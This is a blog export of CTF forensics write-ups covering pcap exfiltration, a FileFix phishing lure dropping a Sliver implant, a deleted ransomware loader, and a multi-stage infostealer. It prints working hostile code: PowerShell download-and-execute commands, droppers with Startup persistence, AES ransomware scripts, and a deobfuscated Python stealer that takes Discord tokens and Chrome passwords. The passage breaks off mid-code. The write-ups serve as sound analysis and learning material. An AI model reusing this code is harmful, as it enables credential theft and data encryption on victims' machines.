[{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"ctf","type":"tags"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"ctf","type":"categories"},{"content":" SOC intern tasking # You are a brand new intern on the job, and, day one, some crucial data got stolen from your servers. You see a strange IP and some strange requests, but you can\u0026rsquo;t quite figure out what he stole. You have til the end of the day to figure it out, or you\u0026rsquo;re fired!\nFlag: idek{th1nk1ng_l1k3_a_r3d_t3amer}\n#ctf #foresnic #misc #pcap\nDisclaimer: I did not manage to solve this during the CTF, but here\u0026rsquo;s what I\u0026rsquo;ve learned so far.\nevil.pcapng # We are given a packet capture of a exfiltration traffic. Starting off there\u0026rsquo;s a GET request to 143.198.13.84/instructions.png. Let\u0026rsquo;s preview that image by File \u0026gt; Export Objects \u0026gt; HTTP \u0026gt; (Select instructions.png and preview). It says to not forget about the reverse proxy. The team did some stego checks and found nothing in the image as well. After that, it is observed that multiple GET requests to 143.198.13.84 with different user agents are responded with the status 404. It could be that these requested path does not exists. However do note that the request to /instructions.png is responded with status 200. There\u0026rsquo;s also a GET request to 143.198.13.84/password.txt but it was responded with 404 Not Found. The user agent used here is CURL, which may or may not indicate hands on keyboard activity by the attacker. But it is worth noting that the path /password.txt might be something important. Looking through the entire packet capture, towards 143.198.13.84 there\u0026rsquo;s only GET request. So the data exfiltration should be through the path requested, but how do we filter it?\nfound the Trend Micro Easter egg here : ) Let\u0026rsquo;s first try with navigating to 143.198.13.84/instructions.png from the browser, weird that it shows as 404 Not Found as the packet capture shows response status 200. After changing the user agent to my-python-requests-useragent as observed in the packet capture and we can successfully view the instructions.png. Now let\u0026rsquo;s try accessing the password.txt and it can be accessed without throwing the 404 Not Found. The password verysecureidek2025themedpassword might be used for the encryption of the exfiltrated data. Knowing that the user agent might be the key factor here, we can use the my-python-requests-useragent user agent as filter criteria and extract all the GET request path. I am going to use tshark to aid with the path extractions, and remove the instructions.png, do note that this is mixture of of URL encoded and ASCII path.\ntshark -r evil.pcapng -Y \u0026#39;http.user_agent contains \u0026#34;my-python-requests-useragent\u0026#34;\u0026#39; -T fields -e http.request.uri | grep -v \u0026#39;^/instructions\\.png$\u0026#39; | sed \u0026#39;s/[\\/%]//g\u0026#39; | tr -d \u0026#39;\\n\u0026#39; 1F01171208110BD1C0EX0A0245E01Y062B093A1FV002F1540121A0A0019 Using CyberChef, we can URL Encode the entire request path, convert from hex to raw and finally XOR it with the password obtained earlier. This challenge is fun I would say, just that we didn\u0026rsquo;t thought of trying to access the site with different user agents which emphasize on thinking outside the box mentality. This technique is commonly used by threat actor to deter with investigation, so kudos to the challenge author for this awesome challenge.\n","date":"4 August 2025","externalUrl":null,"permalink":"/posts/idekctf2025/","section":"Posts","summary":"This page contains idekCTF 2025 writeups, covering SOC intern tasking in the misc category.","title":"idekCTF 2025","type":"posts"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Silver Moon # Rumors whisper of a shadow moving beneath the Silver Moon. Investigate the strange occurrences and reveal the demon’s hidden technique before it’s too late WARNING: Do not run the malware file on your PC. https://powershell.wwctf.com/\nFlag: wwf{f1l3f1x_t0_sl1v3r_b34c0n}\n#ctf #foresnic #malware\nFile Fix Phishing Page # Upon visiting the page, we are served with file fix phishing page.\nUpon copying the fake file path, the malicious script can be observed.\npowershell -ep bypass -w hidden IEX(New-ObjEct System.Net.Webclient).Downloadstring(\u0026#39;https://powershell.wwctf.com/update.ps1\u0026#39;) # C:\\HR\\Application.docx Initial PowerShell Script # The malicious powershell loader contains a huge base64 encoded payload.\nSummary of the powershell script:\nDecode the base64 blob and creates a cmd script.\nCreates a folder J1Csum3Dcj in the user\u0026rsquo;s document directory\nDrop the update.exe and add persistence via Run Key\nCMD Script # Decoding the initial base64 blob shows the cmd script, which contains the base64 encoded of the update.exe\nExtract update.exe # The update.exe can be extracted from the base64 encoded blob from the cmd script.\nStatic Analysis (update.exe) # Detect It Easy (DIE) # Shows as PE64 on DIE\nVirus Total # On VirusTotal it was flagged by numerous vendors and tagged as Sliver\nCAPA # From the CAPA output, the update.exe seems to be loading something to the memory with RWX permission.\nDecompile update.exe # Going through the main function of update.exe, it can be observed that it was performing some anti-analysis with timing checks.\nThis is the part where it performs the setup for injection of the shellcode into memory.\nif ( !VirtualProtect(\u0026amp;loc_140001520, 0xA82EDCui64, 0x40u, \u0026amp;flOldProtect) ) { GetLastError(); sub_140001010(\u0026#34;Error: %d\u0026#34;); } Reading through the documentation of VirtualProtect API, we can get the following information:\nVirtual address of the shellcode: loc_140001520\nSize of the shellcode: 0xA82ED\nMemory protection option: RWX\nGoing through the decompiled code, the shellcode was encrypted using RC4. So we can decrypt the shellcode from the virtual location that stores the shellcode.\nSize and location of shellcode:\nRC4 Key advapi32.dll\nExtracting the shellcode # There are 2 ways to extract the shellcode.\nMethod 1: # As we already know the location of the shellcode, size and the RC4 key used. I feed ChatGPT with the decryption routine code from the decompiled code, and it generates the decryption script as below:\nDecryption Script:\nimport pefile SHELLCODE_SIZE = 0xA82EDC SHELLCODE_VA = 0x140001520 # Virtual address of encrypted shellcode KEY = b\u0026#34;advapi32.dll\u0026#34; EXE_NAME = \u0026#34;update.exe\u0026#34; OUTPUT_NAME = \u0026#34;decrypted_shellcode.bin\u0026#34; def initialize_sbox(key: bytes) -\u0026gt; list: sbox = list(range(256)) j = 0 for i in range(256): j = (j + sbox[i] + key[i % len(key)]) % 256 sbox[i], sbox[j] = sbox[j], sbox[i] return sbox def rc4_like_decrypt(data: bytes, sbox: list) -\u0026gt; bytes: i = 0 j = 0 output = bytearray(len(data)) for n in range(len(data)): i = (i + 1) % 256 j = (j + sbox[i]) % 256 sbox[i], sbox[j] = sbox[j], sbox[i] k = sbox[(sbox[i] + sbox[j]) % 256] output[n] = data[n] ^ k return bytes(output) def va_to_file_offset(pe: pefile.PE, va: int) -\u0026gt; int: rva = va - pe.OPTIONAL_HEADER.ImageBase return pe.get_offset_from_rva(rva) def main(): # Load PE file pe = pefile.PE(EXE_NAME) # Convert virtual address to file offset file_offset = va_to_file_offset(pe, SHELLCODE_VA) # Sanity check with open(EXE_NAME, \u0026#34;rb\u0026#34;) as f: f.seek(file_offset) encrypted_data = f.read(SHELLCODE_SIZE) if len(encrypted_data) != SHELLCODE_SIZE: raise ValueError(f\u0026#34;Expected {SHELLCODE_SIZE} bytes, got {len(encrypted_data)}\u0026#34;) print(f\u0026#34;[+] Read encrypted data from offset 0x{file_offset:X}\u0026#34;) # Decrypt sbox = initialize_sbox(KEY) decrypted_data = rc4_like_decrypt(encrypted_data, sbox) # Write to output file with open(OUTPUT_NAME, \u0026#34;wb\u0026#34;) as f: f.write(decrypted_data) print(f\u0026#34;[+] Decrypted shellcode saved to {OUTPUT_NAME}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Method 2: # The second method is to execute the update.exe and use Process Hacker to view the memory region with RWX protection, and extract it that way. Learned this after reading Omega-Squad Team writeup.\nThe decrypted shellcode can be saved, this is easier method by using dynamic analysis.\nBoth method does contain the shellcode, but the second method does contain some null bytes before/after the shellcode.\nDynamic Analysis (update.exe) # Upon running the update.exe using AnyRun, nothing notable was observed but this outgoing traffic towards 192.168.75.130:80 at the /authenticate/login.html seems to be performing some authentication.\nFlag obtained # Knowing the possible C2 IP, looking through the dumped shellcode binary, the flag can be seen from the query parameter flag= towards the IP 192.168.75.130.\nDecoding the base64 will show the flag.\nLearned a lot from this challenge especially the dumping of shellcode part.\n","date":"1 August 2025","externalUrl":null,"permalink":"/posts/wwctf-2025/","section":"Posts","summary":"This page contains WWCTF 2025 writeups, covering Silver Moon in the forensics category.","title":"WWCTF 2025","type":"posts"},{"content":"This is my first time joining L3akCTF, the challenges are really fun to solve. I solved for the Ghost In The Dark and BOMbardino crocodile, and provided some assitance for my 🐐 teammate who solved the Wi-Fight A Ghost? and L3ak Advanced Defenders. I definitely learned something new while playing these awesome challenges.\nForensic # Ghost In The Dark # A removable drive was recovered from a compromised system. Files appear encrypted, and a strange ransom note is all that remains.\nThe payload? Gone.\nThe key? Vanished.\nBut traces linger in the shadows. Recover what was lost.\nFlag: L3AK{d3let3d_but_n0t_f0rg0tt3n}\n#ctf #forensic\nWe are provided with the split archive GhostInTheDark.001. Upon extracting it using 7-Zip, we observe a ransom note, several encrypted files, and a hidden directory containing NTFS system files. Inside the [SYSTEM] folder, there\u0026rsquo;s a notable $MFT (Master File Table) metadata file. Let\u0026rsquo;s examine it using Eric Zimmerman\u0026rsquo;s tool, MFTExplorer After importing the $MFT file into MFTExplorer, a deleted loader.ps1 along with it\u0026rsquo;s content can be observed. Loader.ps1 # $key = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;0123456789abcdef\u0026#34;) $iv = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;abcdef9876543210\u0026#34;) $AES = New-Object System.Security.Cryptography.AesManaged $AES.Key = $key $AES.IV = $iv $AES.Mode = \u0026#34;CBC\u0026#34; $AES.Padding = \u0026#34;PKCS7\u0026#34; $enc = Get-Content \u0026#34;L:\\payload.enc\u0026#34; -Raw $bytes = [System.Convert]::FromBase64String($enc) $decryptor = $AES.CreateDecryptor() $plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length) $script = [System.Text.Encoding]::UTF8.GetString($plaintext) Invoke-Expression $script # Self-delete Remove-Item $MyInvocation.MyCommand.Path The loader.ps1 script is self-explanatory—it decrypts an encrypted payload using hard-coded AES key and IV values, then executes the decrypted content. This can be decrypted manually using CyberChef with the following parameters:\nKey: 0123456789abcdef\nIV: abcdef9876543210\nMode: CBC\nPayload.ps1 # $key = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;m4yb3w3d0nt3x1st\u0026#34;) $iv = [System.Text.Encoding]::UTF8.GetBytes(\u0026#34;l1f31sf0rl1v1ng!\u0026#34;) $AES = New-Object System.Security.Cryptography.AesManaged $AES.Key = $key $AES.IV = $iv $AES.Mode = \u0026#34;CBC\u0026#34; $AES.Padding = \u0026#34;PKCS7\u0026#34; # Load plaintext flag from C:\\ (never written to L:\\ in plaintext) $flag = Get-Content \u0026#34;C:\\Users\\Blue\\Desktop\\StageRansomware\\flag.txt\u0026#34; -Raw $encryptor = $AES.CreateEncryptor() $bytes = [System.Text.Encoding]::UTF8.GetBytes($flag) $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length) [System.IO.File]::WriteAllBytes(\u0026#34;L:\\flag.enc\u0026#34;, $cipher) # Encrypt other files staged in D:\\ (or L:\\ if you\u0026#39;re using L:\\ now) $files = Get-ChildItem \u0026#34;L:\\\u0026#34; -File | Where-Object { $_.Name -notin @(\u0026#34;ransom.ps1\u0026#34;, \u0026#34;ransom_note.txt\u0026#34;, \u0026#34;flag.enc\u0026#34;, \u0026#34;payload.enc\u0026#34;, \u0026#34;loader.ps1\u0026#34;) } foreach ($file in $files) { $plaintext = Get-Content $file.FullName -Raw $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext) $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length) [System.IO.File]::WriteAllBytes(\u0026#34;L:\\$($file.BaseName).enc\u0026#34;, $cipher) Remove-Item $file.FullName } # Write ransom note $ransomNote = @\u0026#34; i didn\u0026#39;t mean to encrypt them. i was just trying to remember. the key? maybe it\u0026#39;s still somewhere in the dark. the script? it was scared, so it disappeared too. maybe you\u0026#39;ll find me. maybe you\u0026#39;ll find yourself. - vivi (or his ghost) \u0026#34;@ Set-Content \u0026#34;L:\\ransom_note.txt\u0026#34; $ransomNote -Encoding UTF8 # Self-delete Remove-Item $MyInvocation.MyCommand.Path The payload will encrypt all the files in the L: directory except for the pre-defined files using the hard-coded key and IV. The flag can be observed after decrypting the encrypted flag file using CyberChef with the following parameters:\nKey: m4yb3w3d0nt3x1st\nIV: l1f31sf0rl1v1ng!\nMode: CBC\nShoutout to VivisGhost for this 👻 challenge.\nBOMbardino crocodile # APT Lobster has successfully breached a machine in our network, marking their first confirmed intrusion. Fortunately, the DFIR team acted quickly, isolating the compromised system and collecting several suspicious files for analysis. Among the evidence, they also recovered an outbound email sent by the attacker just before containment, I wonder who was he communicating with\u0026hellip;The flag consists of 2 parts.\nFlag: L3AK{Br40d0_st34L3r_0r_br41nr0t}\n#ctf #forensic\nWe are given an email file and a snapshot of the C drive. The email contains an invite link to the LobsterLeaks server, which harvests all captured data from the infostealer.\nArtifact Analysis # Email # After joining the Discord server, an encrypted flag file, an empty passwords archive, and metadata of the victim can be observed in the public lobsterl3aks channel.\nLobsterLeak Discord # As for the artifact snapshot, the crustacean downloads folder contains some interesting files for further investigation. lil-l3ak-exam.pdf # There\u0026rsquo;s a download link for Lil-L3ak-secret-plans-for-tonight archive file in the PDF, which I assume the extracted content is the Lil L3ak secret plans for tonight.bat file.\nLil L3ak secret plans for tonight.bat # If we open the original batch file in a text editor, it displays as Chinese characters due to the FF FE Byte Order Mark (BOM) at the beginning of the file. This causes the text editor to interpret it as a UTF-16LE encoded file. After stripping the BOM and removing unused echo commands, we get a readable first-stage script. It downloads a second-stage file hosted on GitHub (which is currently inaccessible), so we need to locate the downloaded batch file in the Temp folder.\nstart /min cmd /c \u0026#34;powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri \u0026#39;https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat\u0026#39; -OutFile \u0026#39;%TEMP%\\temp.bat\u0026#39;; Start-Process -FilePath \u0026#39;%TEMP%\\temp.bat\u0026#39; -WindowStyle Hidden\u0026#34; Indeed, the temp.bat file is still present in the Temp folder and is similarly obfuscated using the BOM technique. After cleaning it, we get the second-stage script. temp.bat # start /min powershell.exe -WindowStyle Hidden -Command \u0026#34;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile(\u0026#39;https://github.com/bluecrustacean/oceanman/raw/main/ud.bat\u0026#39;, \u0026#39;%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsSecure.bat\u0026#39;); (New-Object -TypeName System.Net.WebClient).DownloadFile(\u0026#39;https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym\u0026amp;st=mtz77hlx\u0026amp;dl=1\u0026#39;, \u0026#39;C:\\\\Users\\\\Public\\\\Document.zip\u0026#39;); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\u0026#39;C:/Users/Public/Document.zip\u0026#39;, \u0026#39;C:/Users/Public/Document\u0026#39;); Start-Sleep -Seconds 60; C:\\\\Users\\\\Public\\\\Document\\\\python.exe C:\\Users\\Public\\Document\\Lib\\leak.py; Remove-Item \u0026#39;C:/Users/Public/Document.zip\u0026#39; -Force\u0026#34; \u0026amp;\u0026amp; exit Summary:\nDownloads a script from GitHub (currently inaccessible) and places it in the Startup folder (WindowsSecure.bat) for persistence. Downloads an archive, extracts it to C:/Users/Public/Document, executes leak.py, then removes the archive. My first thought is to look into the leak.py as it seems to be the main logic of this infostealer, hence I started with that first.\nleak.py # _ = lambda __ : __import__(\u0026#39;base64\u0026#39;).b64decode(__[::-1]);exec((_)(b\u0026#39;=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp1Vj1mUZRFbOFmYGRGMW1GeoJVMadlVYxmbSJjThN2RxMFVF9WeZRlTr1UMSllUtBHWZVlSxV1aW9UTWplcX1WNYRmM0VUWxI0UhFjShVlaKdlTHdGeWxGbHZ1a180VrpFakBjWzZ1a5cUTWJ1VXxmVPd1RSJnVxgWYiVUMM90VxUlVYJkVWJjRwImVONjWHhXaRJjU1Z1Mj\u0026lt;snipped\u0026gt;\u0026#39;)) I used this cool CyberChef recipe to decode the nested base64 encoded python script:\nLabel(\u0026#39;top\u0026#39;) Regular_expression(\u0026#39;User defined\u0026#39;,\u0026#39;[a-zA-Z0-9+/=]{30,}\u0026#39;,true,true,false,false,false,false,\u0026#39;List matches\u0026#39;) Reverse(\u0026#39;Character\u0026#39;) From_Base64(\u0026#39;A-Za-z0-9+/=\u0026#39;,true,false) Conditional_Jump(\u0026#39;psutil\u0026#39;,true,\u0026#39;top\u0026#39;,100) The jump keyword psutil is used here as it appears in the site-packages. Other options like discord or PIL also work as long as they exist in the decoded source. After decoding, the readable python script as follow:\nDeobfuscated leak.py # import psutil import platform import json from datetime import datetime from time import sleep import requests import socket from requests import get import os import re import subprocess from uuid import getnode as get_mac import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, os, re, sys, sqlite3 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes) from cryptography.hazmat.primitives.ciphers.aead import AESGCM from cryptography.hazmat.backends import default_backend from Crypto.Cipher import AES from base64 import b64decode, b64encode from subprocess import Popen, PIPE from json import loads, dumps from shutil import copyfile from sys import argv import discord from discord.ext import commands from io import BytesIO intents = discord.Intents.default() intents.message_content = True bot = commands.Bot(command_prefix=\u0026#39;!\u0026#39;, intents=intents) def scale(bytes, suffix=\u0026#34;B\u0026#34;): defined = 1024 for unit in [\u0026#34;\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;M\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;T\u0026#34;, \u0026#34;P\u0026#34;]: if bytes \u0026lt; defined: return f\u0026#34;{bytes:.2f}{unit}{suffix}\u0026#34; bytes /= defined uname = platform.uname() bt = datetime.fromtimestamp(psutil.boot_time()) host = socket.gethostname() localip = socket.gethostbyname(host) publicip = get(f\u0026#39;https://ipinfo.io/ip\u0026#39;).text city = get(f\u0026#39;https://ipinfo.io/{publicip}/city\u0026#39;).text region = get(f\u0026#39;https://ipinfo.io/{publicip}/region\u0026#39;).text postal = get(f\u0026#39;https://ipinfo.io/{publicip}/postal\u0026#39;).text timezone = get(f\u0026#39;https://ipinfo.io/{publicip}/timezone\u0026#39;).text currency = get(f\u0026#39;https://ipinfo.io/{publicip}/currency\u0026#39;).text country = get(f\u0026#39;https://ipinfo.io/{publicip}/country\u0026#39;).text loc = get(f\u0026#34;https://ipinfo.io/{publicip}/loc\u0026#34;).text vpn = requests.get(\u0026#39;http://ip-api.com/json?fields=proxy\u0026#39;) proxy = vpn.json()[\u0026#39;proxy\u0026#39;] mac = get_mac() roaming = os.getenv(\u0026#39;AppData\u0026#39;) output = open(roaming + \u0026#34;temp.txt\u0026#34;, \u0026#34;a\u0026#34;) Directories = { \u0026#39;Discord\u0026#39;: roaming + \u0026#39;\\\\Discord\u0026#39;, \u0026#39;Discord Two\u0026#39;: roaming + \u0026#39;\\\\discord\u0026#39;, \u0026#39;Discord Canary\u0026#39;: roaming + \u0026#39;\\\\Discordcanary\u0026#39;, \u0026#39;Discord Canary Two\u0026#39;: roaming + \u0026#39;\\\\discordcanary\u0026#39;, \u0026#39;Discord PTB\u0026#39;: roaming + \u0026#39;\\\\discordptb\u0026#39;, \u0026#39;Google Chrome\u0026#39;: roaming + \u0026#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default\u0026#39;, \u0026#39;Opera\u0026#39;: roaming + \u0026#39;\\\\Opera Software\\\\Opera Stable\u0026#39;, \u0026#39;Brave\u0026#39;: roaming + \u0026#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\u0026#39;, \u0026#39;Yandex\u0026#39;: roaming + \u0026#39;\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\u0026#39;, } def Yoink(Directory): Directory += \u0026#39;\\\\Local Storage\\\\leveldb\u0026#39; Tokens = [] for FileName in os.listdir(Directory): if not FileName.endswith(\u0026#39;.log\u0026#39;) and not FileName.endswith(\u0026#39;.ldb\u0026#39;): continue for line in [x.strip() for x in open(f\u0026#39;{Directory}\\\\{FileName}\u0026#39;, errors=\u0026#39;ignore\u0026#39;).readlines() if x.strip()]: for regex in (r\u0026#39;[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\u0026#39;, r\u0026#39;mfa\\.[\\w-]{84}\u0026#39;): for Token in re.findall(regex, line): Tokens.append(Token) return Tokens def Wipe(): if os.path.exists(roaming + \u0026#34;temp.txt\u0026#34;): output2 = open(roaming + \u0026#34;temp.txt\u0026#34;, \u0026#34;w\u0026#34;) output2.write(\u0026#34;\u0026#34;) output2.close() else: pass realshit = \u0026#34;\u0026#34; for Discord, Directory in Directories.items(): if os.path.exists(Directory): Tokens = Yoink(Directory) if len(Tokens) \u0026gt; 0: for Token in Tokens: realshit += f\u0026#34;{Token}\\n\u0026#34; cpufreq = psutil.cpu_freq() svmem = psutil.virtual_memory() partitions = psutil.disk_partitions() disk_io = psutil.disk_io_counters() net_io = psutil.net_io_counters() partitions = psutil.disk_partitions() partition_usage = None for partition in partitions: try: partition_usage = psutil.disk_usage(partition.mountpoint) break except PermissionError: continue system_info = { \u0026#34;embeds\u0026#34;: [ { \u0026#34;title\u0026#34;: f\u0026#34;Hah Gottem! - {host}\u0026#34;, \u0026#34;color\u0026#34;: 8781568 }, { \u0026#34;color\u0026#34;: 7506394, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;GeoLocation\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Using VPN?: {proxy}\\nLocal IP: {localip}\\nPublic IP: {publicip}\\nMAC Adress: {mac}\\n\\nCountry: {country} | {loc} | {timezone}\\nregion: {region}\\nCity: {city} | {postal}\\nCurrency: {currency}\\n\\n\\n\\n\u0026#34; } ] }, { \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;System Information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;System: {uname.system}\\nNode: {uname.node}\\nMachine: {uname.machine}\\nProcessor: {uname.processor}\\n\\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\u0026#34; } ] }, { \u0026#34;color\u0026#34;: 15109662, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;CPU Information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Psychical cores: {psutil.cpu_count(logical=False)}\\nTotal Cores: {psutil.cpu_count(logical=True)}\\n\\nMax Frequency: {cpufreq.max:.2f}Mhz\\nMin Frequency: {cpufreq.min:.2f}Mhz\\n\\nTotal CPU usage: {psutil.cpu_percent()}\\n\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Memory Information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Total: {scale(svmem.total)}\\nAvailable: {scale(svmem.available)}\\nUsed: {scale(svmem.used)}\\nPercentage: {svmem.percent}%\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Disk Information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Total Size: {scale(partition_usage.total)}\\nUsed: {scale(partition_usage.used)}\\nFree: {scale(partition_usage.free)}\\nPercentage: {partition_usage.percent}%\\n\\nTotal read: {scale(disk_io.read_bytes)}\\nTotal write: {scale(disk_io.write_bytes)}\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Network Information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Total Sent: {scale(net_io.bytes_sent)}\\nTotal Received: {scale(net_io.bytes_recv)}\u0026#34; } ] }, { \u0026#34;color\u0026#34;: 7440378, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Discord information\u0026#34;, \u0026#34;value\u0026#34;: f\u0026#34;Token: {realshit}\u0026#34; } ] } ] } DBP = r\u0026#39;Google\\Chrome\\User Data\\Default\\Login Data\u0026#39; ADP = os.environ[\u0026#39;LOCALAPPDATA\u0026#39;] def sniff(path): path += \u0026#39;\\\\Local Storage\\\\leveldb\u0026#39; tokens = [] try: for file_name in os.listdir(path): if not file_name.endswith(\u0026#39;.log\u0026#39;) and not file_name.endswith(\u0026#39;.ldb\u0026#39;): continue for line in [x.strip() for x in open(f\u0026#39;{path}\\\\{file_name}\u0026#39;, errors=\u0026#39;ignore\u0026#39;).readlines() if x.strip()]: for regex in (r\u0026#39;[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\u0026#39;, r\u0026#39;mfa\\.[\\w-]{84}\u0026#39;): for token in re.findall(regex, line): tokens.append(token) return tokens except: pass def encrypt(cipher, plaintext, nonce): cipher.mode = modes.GCM(nonce) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext) return (cipher, ciphertext, nonce) def decrypt(cipher, ciphertext, nonce): cipher.mode = modes.GCM(nonce) decryptor = cipher.decryptor() return decryptor.update(ciphertext) def rcipher(key): cipher = Cipher(algorithms.AES(key), None, backend=default_backend()) return cipher def dpapi(encrypted): import ctypes import ctypes.wintypes class DATA_BLOB(ctypes.Structure): _fields_ = [(\u0026#39;cbData\u0026#39;, ctypes.wintypes.DWORD), (\u0026#39;pbData\u0026#39;, ctypes.POINTER(ctypes.c_char))] p = ctypes.create_string_buffer(encrypted, len(encrypted)) blobin = DATA_BLOB(ctypes.sizeof(p), p) blobout = DATA_BLOB() retval = ctypes.windll.crypt32.CryptUnprotectData( ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)) if not retval: raise ctypes.WinError() result = ctypes.string_at(blobout.pbData, blobout.cbData) ctypes.windll.kernel32.LocalFree(blobout.pbData) return result def localdata(): jsn = None with open(os.path.join(os.environ[\u0026#39;LOCALAPPDATA\u0026#39;], r\u0026#34;Google\\Chrome\\User Data\\Local State\u0026#34;), encoding=\u0026#39;utf-8\u0026#39;, mode=\u0026#34;r\u0026#34;) as f: jsn = json.loads(str(f.readline())) return jsn[\u0026#34;os_crypt\u0026#34;][\u0026#34;encrypted_key\u0026#34;] def decryptions(encrypted_txt): encoded_key = localdata() encrypted_key = base64.b64decode(encoded_key.encode()) encrypted_key = encrypted_key[5:] key = dpapi(encrypted_key) nonce = encrypted_txt[3:15] cipher = rcipher(key) return decrypt(cipher, encrypted_txt[15:], nonce) class chrome: def __init__(self): self.passwordList = [] def chromedb(self): _full_path = os.path.join(ADP, DBP) _temp_path = os.path.join(ADP, \u0026#39;sqlite_file\u0026#39;) if os.path.exists(_temp_path): os.remove(_temp_path) shutil.copyfile(_full_path, _temp_path) self.pwsd(_temp_path) def pwsd(self, db_file): conn = sqlite3.connect(db_file) _sql = \u0026#39;select signon_realm,username_value,password_value from logins\u0026#39; for row in conn.execute(_sql): host = row[0] if host.startswith(\u0026#39;android\u0026#39;): continue name = row[1] value = self.cdecrypt(row[2]) _info = \u0026#39;[==================]\\nhostname =\u0026gt; : %s\\nlogin =\u0026gt; : %s\\nvalue =\u0026gt; : %s\\n[==================]\\n\\n\u0026#39; % (host, name, value) self.passwordList.append(_info) conn.close() os.remove(db_file) def cdecrypt(self, encrypted_txt): if sys.platform == \u0026#39;win32\u0026#39;: try: if encrypted_txt[:4] == b\u0026#39;\\x01\\x00\\x00\\x00\u0026#39;: decrypted_txt = dpapi(encrypted_txt) return decrypted_txt.decode() elif encrypted_txt[:3] == b\u0026#39;v10\u0026#39;: decrypted_txt = decryptions(encrypted_txt) return decrypted_txt[:-16].decode() except WindowsError: return None else: pass def saved(self): try: with open(r\u0026#39;C:\\ProgramData\\passwords.txt\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: f.writelines(self.passwordList) except WindowsError: return None @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) channel = bot.get_channel(CHANNEL_ID) if not channel: print(f\u0026#34;Could not find channel with ID: {CHANNEL_ID}\u0026#34;) return main = chrome() try: main.chromedb() except Exception as e: print(f\u0026#34;Error getting Chrome passwords: {e}\u0026#34;) main.saved() await exfiltrate_data(channel) await bot.close() async def exfiltrate_data(channel): try: hostname = requests.get(\u0026#34;https://ipinfo.io/ip\u0026#34;).text except: hostname = \u0026#34;Unknown\u0026#34; local = os.getenv(\u0026#39;LOCALAPPDATA\u0026#39;) roaming = os.getenv(\u0026#39;APPDATA\u0026#39;) paths = { \u0026#39;Discord\u0026#39;: roaming + \u0026#39;\\\\Discord\u0026#39;, \u0026#39;Discord Canary\u0026#39;: roaming + \u0026#39;\\\\discordcanary\u0026#39;, \u0026#39;Discord PTB\u0026#39;: roaming + \u0026#39;\\\\discordptb\u0026#39;, \u0026#39;Google Chrome\u0026#39;: local + \u0026#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default\u0026#39;, \u0026#39;Opera\u0026#39;: roaming + \u0026#39;\\\\Opera Software\\\\Opera Stable\u0026#39;, \u0026#39;Brave\u0026#39;: local + \u0026#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\u0026#39;, \u0026#39;Yandex\u0026#39;: local + \u0026#39;\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\u0026#39; } message = \u0026#39;\\n\u0026#39; for platform, path in paths.items(): if not os.path.exists(path): continue message += \u0026#39;```\u0026#39; tokens = sniff(path) if len(tokens) \u0026gt; 0: for token in tokens: message += f\u0026#39;{token}\\n\u0026#39; else: pass message += \u0026#39;```\u0026#39; try: from PIL import ImageGrab from 